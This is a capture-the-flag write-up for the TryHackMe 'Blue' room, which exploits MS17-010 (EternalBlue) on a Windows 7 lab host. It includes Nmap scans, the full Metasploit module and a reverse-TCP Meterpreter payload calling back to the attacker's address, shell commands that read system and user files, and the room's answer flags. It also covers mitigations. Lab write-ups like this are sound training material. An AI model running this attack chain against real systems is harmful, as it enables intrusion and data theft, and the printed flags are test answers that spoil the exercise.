# 🔵 TryHackMe CTF Write-up — Blue

**MS17-010 (EternalBlue) | Windows 7 SP1 x64 | Metasploit**

---

## 🧭 Overview

**Blue** is a TryHackMe room focused on exploiting a vulnerable Windows 7 machine through **MS17-010 (EternalBlue)**, a critical remote code execution vulnerability affecting SMBv1.

The objective was to:

* 🔎 Identify exposed services
* 🛡️ Confirm the MS17-010 vulnerability
* 💥 Exploit the vulnerable SMB service
* 🐚 Obtain a Meterpreter shell
* 🔍 Perform post-exploitation enumeration
* 🚩 Recover three planted flags

---

## 🎯 Objective

The objective of this engagement was to identify and exploit a Windows 7 host running a vulnerable SMB service, obtain remote code execution using Metasploit, and recover three planted flags from the compromised system.

---

## 🔎 Reconnaissance

### 📡 Initial Nmap Scan

I started with an Nmap scan to identify open ports, running services, and the target operating system:

```bash
nmap -sC -sV -Pn 10.130.135.8
```

The scan identified the following open ports:

| Port        | Service     | Description             |
| ----------- | ----------- | ----------------------- |
| `135/tcp`   | RPC         | Microsoft RPC           |
| `139/tcp`   | NetBIOS-SMB | SMB over NetBIOS        |
| `445/tcp`   | SMB         | Microsoft SMB           |
| `3389/tcp`  | RDP         | Remote Desktop Protocol |
| `49152/tcp` | RPC         | Dynamic RPC             |

The target was identified as:

```text
Windows 7 Professional SP1 x64
Hostname: JON-PC
Domain: WORKGROUP
```


<img width="860" height="403" alt="image" src="https://github.com/user-attachments/assets/f2eee523-ad38-4637-97fb-ea51d2175171" />

---

## 🛡️ SMB Vulnerability Identification

Since SMB was exposed on port `445`, I performed a targeted vulnerability check for **MS17-010**:

```bash
nmap --script smb-vuln-ms17-010 -p445 10.130.135.8
```

The scan confirmed that the target was vulnerable:

```text
MS17-010 VULNERABLE
CVE-2017-0143
Risk: HIGH
```

**MS17-010**, commonly associated with the **EternalBlue** exploit, is a critical remote code execution vulnerability in Microsoft's SMBv1 implementation.


<img width="643" height="339" alt="image" src="https://github.com/user-attachments/assets/63c6911d-b7cd-4e16-8379-128b631b9aef" />

---

## ⚙️ Attack Setup

Before launching the exploit, I checked the available network interfaces to identify the correct VPN address for the reverse connection:

```bash
ip a
```

The TryHackMe VPN interface was:

```text
tun0
```

with the following IP address:

```text
192.168.167.44
```

This address was used as the **LHOST** for the reverse Meterpreter connection.


<img width="715" height="329" alt="image" src="https://github.com/user-attachments/assets/67835fdd-d1e4-4f5b-b300-f29feb694a05" />

---

## 💥 Exploitation with Metasploit

I launched Metasploit:

```bash
msfconsole
```

Then selected the EternalBlue exploit module:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

The target and payload were configured as follows:

```text
set RHOSTS 10.130.135.8
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.167.44
```

Finally, the exploit was executed:

```text
run
```

The exploit succeeded and a **Meterpreter session** was opened, confirming successful remote code execution on the target.


<img width="692" height="133" alt="image" src="https://github.com/user-attachments/assets/93b840a2-6b36-4fc7-91b0-802661a45876" />

I then spawned a Windows command shell for manual enumeration:

```text
shell
```

---

## 🚩 Flag Discovery

After gaining access to the machine, I started searching for the planted flags.

### 🚩 Flag 1 — System Root

The first flag was located in the root of the `C:` drive:

```text
C:\flag1.txt
```

It was read using:

```cmd
type C:\flag1.txt
```

**Flag 1:**

```text
flag{access_the_machine}
```


<img width="311" height="254" alt="image" src="https://github.com/user-attachments/assets/2c393f0e-fadf-4833-af13-bcb846e4252f" />

---

### 🚩 Flag 2 — System32\config

The second flag was located inside:

```text
C:\Windows\System32\config\flag2.txt
```

This directory is particularly interesting because it contains sensitive Windows registry hive files.

The flag was retrieved using:

```cmd
type C:\Windows\System32\config\flag2.txt
```

**Flag 2:**

```text
flag{sam_database_elevated_access}
```


<img width="311" height="289" alt="image" src="https://github.com/user-attachments/assets/356850b2-fa7b-49e4-901d-46392ee58fce" />

---

### 🚩 Flag 3 — Jon's Documents

The final flag was located inside the user's Documents directory:

```text
C:\Users\Jon\Documents\flag3.txt
```

It was retrieved using:

```cmd
type C:\Users\Jon\Documents\flag3.txt
```

**Flag 3:**

```text
flag{admin_documents_can_be_valuable}
```


<img width="539" height="367" alt="image" src="https://github.com/user-attachments/assets/77aeafe0-cc45-45d6-8f81-1f7469334ae4" />

---

## 🚩 Flags Summary

| #  | File Path                              | Flag                                    |
| -- | -------------------------------------- | --------------------------------------- |
| 01 | `C:\flag1.txt`                         | `flag{access_the_machine}`              |
| 02 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}`    |
| 03 | `C:\Users\Jon\Documents\flag3.txt`     | `flag{admin_documents_can_be_valuable}` |

---

## 🛠️ Commands Reference

### 🔎 Reconnaissance

```bash
nmap -sC -sV -Pn 10.130.135.8
```

```bash
nmap --script smb-vuln-ms17-010 -p445 10.130.135.8
```

```bash
ip a
```

### 💥 Exploitation

```bash
msfconsole
```

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.130.135.8
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.167.44
run
```

### 🐚 Post-Exploitation

```text
shell
```

```cmd
type C:\flag1.txt
```

```cmd
type C:\Windows\System32\config\flag2.txt
```

```cmd
type C:\Users\Jon\Documents\flag3.txt
```

---

## 🧠 Key Takeaways

### 1. SMB Enumeration Is Important

Ports `139` and `445` immediately indicated that SMB was exposed.

When SMB is available, checking for known vulnerabilities should be part of the enumeration process.

### 2. Always Validate Suspected Vulnerabilities

Rather than immediately attempting exploitation, I used the Nmap `smb-vuln-ms17-010` script to confirm that the host was vulnerable to MS17-010.

This provided additional confidence before exploitation.

### 3. EternalBlue Provides Remote Code Execution

MS17-010 demonstrates how a remotely accessible, unpatched SMB service can become a direct path to code execution without requiring valid credentials.

### 4. Post-Exploitation Enumeration Matters

Obtaining a shell is not necessarily the end of an engagement.

Once access is achieved, the compromised system should be systematically enumerated for:

* 🔑 Credentials
* 📁 Sensitive files
* 👤 User information
* ⚙️ Configuration data
* 🚩 Valuable artifacts

### 5. Legacy Systems Can Represent Significant Risk

Windows 7 is an end-of-life operating system, and leaving vulnerable SMBv1 services exposed can create a serious security risk.

---

## 🛡️ Mitigation

The attack could have been prevented or significantly reduced by:

* Applying the **MS17-010 security patch**
* Disabling **SMBv1**
* Restricting unnecessary SMB exposure
* Using host-based firewalls
* Removing or isolating unsupported operating systems
* Keeping Windows systems regularly patched

---

## 🏁 Attack Chain

```text
Nmap
  ↓
SMB Enumeration
  ↓
MS17-010 Detection
  ↓
EternalBlue
  ↓
Remote Code Execution
  ↓
Meterpreter
  ↓
Windows Shell
  ↓
Post-Exploitation Enumeration
  ↓
🚩 Flag 1
🚩 Flag 2
🚩 Flag 3
```

---

## 🏆 Conclusion

This engagement demonstrated an end-to-end exploitation path against a vulnerable Windows 7 host running SMBv1.

The attack began with network reconnaissance, followed by vulnerability confirmation using Nmap. Metasploit was then used to exploit **MS17-010 (EternalBlue)** and obtain a Meterpreter session.

After gaining access, post-exploitation enumeration allowed all three planted flags to be recovered successfully.

The key lesson is straightforward:

> **An unpatched and exposed SMB service can provide an attacker with a direct path to remote code execution.**
